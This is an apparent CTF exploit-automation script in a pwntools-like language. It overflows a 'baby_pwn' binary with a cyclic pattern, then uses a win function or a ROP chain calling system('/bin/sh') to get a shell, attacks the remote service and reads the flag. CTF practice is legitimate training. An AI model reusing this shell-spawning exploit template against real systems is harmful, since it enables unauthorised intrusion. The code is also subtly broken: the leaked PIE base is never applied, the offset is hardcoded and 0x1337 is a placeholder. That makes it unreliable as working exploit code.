# CTF Challenge Automation
# Automates solving a typical CTF pwn challenge

print("[*] CTF Challenge Solver")
print("============================================================")

let challenge_name = "baby_pwn"
let remote_host = "ctf.challenge.com"
let remote_port = 31337

print("[+] Challenge: " + challenge_name)
print("[+] Remote: " + remote_host + ":" + str(remote_port))

# Step 1: Download and analyze binary
print("\n[*] Step 1: Downloading challenge binary...")
download_file("http://ctf.challenge.com/baby_pwn", "./baby_pwn")
make_executable("./baby_pwn")

print("[*] Step 2: Quick binary analysis...")
let checksec_result = checksec("./baby_pwn")
print("    Arch: " + checksec_result["arch"])
print("    NX: " + str(checksec_result["nx"]))
print("    PIE: " + str(checksec_result["pie"]))
print("    Canary: " + str(checksec_result["canary"]))

# Step 2: Test locally
print("\n[*] Step 3: Testing locally...")
let local = process("./baby_pwn")
let banner = recv(local, 1024)
print("    Banner: " + banner)

# Step 3: Find vulnerability
print("\n[*] Step 4: Finding vulnerability...")
print("    Sending cyclic pattern...")
let pattern = cyclic(500)
send(local, pattern)
let crash_data = wait_for_crash(local)

if crash_data.crashed
    let eip = crash_data.registers.rip
    let offset = cyclic_find(pattern, eip)
    print("    [!] CRASH FOUND!")
    print("    RIP: " + hex(eip))
    print("    Offset: " + str(offset))
else
    print("    [-] No crash detected, trying other inputs...")
end

# Step 4: Build exploit
print("\n[*] Step 5: Building exploit...")
let offset = 72  # From crash analysis

# Check if we need to leak addresses
if checksec_result["pie"]
    print("    [*] PIE enabled - need to leak addresses")
    let leak_session = process("./baby_pwn")
    let binary_leak = perform_leak(leak_session)
    let binary_base = binary_leak - 0x1337
    print("    Binary base: " + hex(binary_base))
end

# Find win function or build ROP chain
let elf = parse_elf("./baby_pwn")

if "win" in elf["symbols"]
    print("    [+] Found win function @ " + hex(elf["symbols"]["win"]))
    let win_addr = elf["symbols"]["win"]
    let payload = cyclic(offset) + p64(win_addr)
else
    print("    [*] No win function, building ROP chain...")
    let rop = rop_chain("./baby_pwn")
    rop.call("system", ["/bin/sh"])
    let payload = cyclic(offset) + rop.build()
end

# Step 5: Test exploit locally
print("\n[*] Step 6: Testing exploit locally...")
let test_session = process("./baby_pwn")
send(test_session, payload)
sleep(0.5)

if is_alive(test_session)
    print("    [+] Local exploit successful!")
    send(test_session, "echo PWNED\n")
    let result = recv(test_session, 1024)
    if "PWNED" in result
        print("    [+] Shell confirmed!")
    end
    close(test_session)
else
    print("    [-] Local exploit failed, debugging...")
end

# Step 6: Attack remote
print("\n[*] Step 7: Attacking remote server...")
let remote_session = connect(remote_host, remote_port)
send(remote_session, payload)

print("[+] Exploit sent to remote!")
print("[*] Getting flag...")

send(remote_session, "cat flag.txt\n")
let flag = recv(remote_session, 1024)
print("\n" + "=" * 60)
print("FLAG: " + flag)
print("============================================================")

# Submit flag automatically
if env("CTF_TOKEN")
    print("\n[*] Auto-submitting flag...")
    submit_flag(flag, env("CTF_TOKEN"))
    print("[+] Flag submitted!")
end

print("\n[+] CTF challenge solved!")
